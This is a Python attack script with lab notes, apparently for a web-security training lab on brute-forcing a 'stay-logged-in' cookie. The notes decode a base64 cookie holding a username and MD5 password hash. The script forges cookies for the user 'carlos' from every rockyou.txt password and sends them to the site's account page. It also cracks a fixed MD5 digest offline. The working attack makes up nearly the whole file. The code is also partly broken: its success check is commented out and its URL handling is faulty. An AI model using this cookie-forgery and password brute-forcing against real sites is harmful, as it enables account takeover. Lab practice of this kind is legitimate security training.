'''

Lab: Brute-forcing a stay-logged-in cookie
===========================================
echo -n "Set-Cookie: stay-logged-in=d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw" > keep_logged_in_cookie

┌──(kali㉿kalibth)-[~/…/coding/auth/other_auth/keep_logged_in_cookie]
└─$ cat keep_logged_in_cookie| awk -F= '{print $2}' | base64 -d
wiener:51dc30ddc473d43a6011e9ebba6ca770

51dc30ddc473d43a6011e9ebba6ca770 --> md5(peter)

for carlos user, we need to:
    create stay_logged_in_cookie(username,md5(wordlist))

'''

from dataclasses import dataclass
import sys
import requests
import urllib3
import hashlib, base64

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {"http":"https://127.0.0.1:8080","https":"https://127.0.0.1:8080"}

def main(site):
    login_url = f'https://{site}/my-account'
    with open('/usr/share/wordlists/rockyou.txt','r', encoding='latin-1') as wordlist:
        passwords = wordlist.readlines()
        for p in passwords:
            p = p.strip('\n')
            md5pass = 'carlos:'+hashlib.md5(p.encode()).hexdigest()
            b64hash = base64.b64encode(md5pass.encode())
            cookie = {'stay-logged-in': b64hash.decode('ascii') }
            sys.stdout.write(f'\r --> {p}\r')
            sys.stdout.flush()

            r = requests.get(login_url,cookies=cookie, verify=False, allow_redirects=True, proxies=proxies)
'''
            if r.status_code == 200:
                print (f'password: {p}')
                break
'''
def getpass(digest):
    with open('/usr/share/wordlists/rockyou.txt','r', encoding='latin-1') as wordlist:
        passwords = wordlist.readlines()
        for p in passwords:
            p = p.strip('\n')
            hash = hashlib.md5(p.encode()).hexdigest()
            if hash == 'df0349ce110b69f03b4def8012ae4970':
                print (p)
if __name__ == "__main__":
    site = sys.argv[1]
    if 'https://' in site:  
        site = site.rstrip('/').lstrip('https://')
        main(site)
    else:
        print('[-] Not a valid URL... http[s]://<url>/... exiting!')
        print ('getting password for digest')
        getpass(site)
        sys.exit(-1)